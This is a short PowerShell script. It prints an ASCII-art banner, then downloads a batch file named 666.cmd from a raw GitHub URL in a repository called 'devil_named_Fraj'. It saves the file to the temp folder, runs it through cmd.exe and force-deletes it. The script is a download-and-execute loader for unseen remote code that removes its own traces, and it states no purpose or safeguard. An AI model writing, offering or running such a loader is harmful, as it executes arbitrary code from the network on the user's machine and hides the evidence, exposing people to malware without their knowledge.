Clear-Host

$banner = @(
    "   ____    ______                _   "
    "  / __ \  |  ____|              (_)  "
    " / / _`` | | |__    _ __   __ _   _   "
    "| | (_| | |  __|  | '__| / _`` | | |  "
    "| \__,_ | | |     | |   | (_| | | |  "
    " \____/   |_|     |_|    \__,_| | |  "
    "                               _/ |  "
    "                              |__/   "
)

foreach ($line in $banner) {
    Write-Host $line -ForegroundColor Yellow -BackgroundColor Black
}
Write-Host ""

$url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
$tempFile = "$env:TEMP\666.cmd"

Invoke-RestMethod -Uri $url -OutFile $tempFile
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempFile`"" -Wait
Remove-Item -Path $tempFile -Force
